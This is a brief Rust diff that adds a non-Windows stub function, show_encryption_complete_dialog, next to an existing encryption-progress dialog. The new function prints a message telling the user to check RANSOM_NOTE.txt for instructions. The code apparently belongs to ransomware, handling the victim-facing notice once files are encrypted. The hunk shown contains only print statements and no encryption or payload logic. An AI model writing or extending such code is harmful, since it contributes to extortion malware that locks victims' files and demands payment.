@@ -216,3 +216,9 @@ pub fn show_encryption_progress_dialog(_files_count: usize) -> Result<(), String
     println!("Encryption in progress...");
     Ok(())
 }
+
+#[cfg(not(target_os = "windows"))]
+pub fn show_encryption_complete_dialog(_key_hint: &str) -> Result<(), String> {
+    println!("Encryption complete. Check RANSOM_NOTE.txt for instructions.");
+    Ok(())
+}
